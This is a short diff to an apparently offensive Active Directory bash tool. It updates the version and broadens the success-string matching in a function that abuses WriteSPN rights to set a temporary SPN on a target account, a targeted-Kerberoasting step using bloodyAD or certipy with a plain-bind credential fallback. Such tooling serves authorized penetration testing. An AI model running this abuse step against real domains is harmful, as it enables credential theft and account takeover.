@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.28.1"
+readonly VERSION="1.28.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2802,7 +2802,7 @@ _abuse_writespn() {
     # Keep Kerberos-first, but some bloodyAD/certipy builds fail LDAP SASL while
     # the same account works with a simple bind. Treat that as a tool fallback,
     # not as a policy change.
-    if ! grep -qiE 'success|added|modif|written' <<<"$setout" && [[ -n "$PASS$HASH" ]]; then
+    if ! grep -qiE 'success|added|modif|written|updated|created|removed|has been' <<<"$setout" && [[ -n "$PASS$HASH" ]]; then
         mapfile -t pba < <(bloody_args_plain)
         if [[ ${#pba[@]} -gt 0 ]]; then
             auth_used="plain"
@@ -2812,7 +2812,7 @@ _abuse_writespn() {
         fi
     fi
 
-    if grep -qiE 'success|added|modif|written' <<<"$setout"; then
+    if grep -qiE 'success|added|modif|written|updated|created|removed|has been' <<<"$setout"; then
         local -a rba=("${ba[@]}")
         [[ "$auth_used" == "plain" && ${#pba[@]} -gt 0 ]] && rba=("${pba[@]}")
         rb_record "Set temporary SPN $spn on $target" \
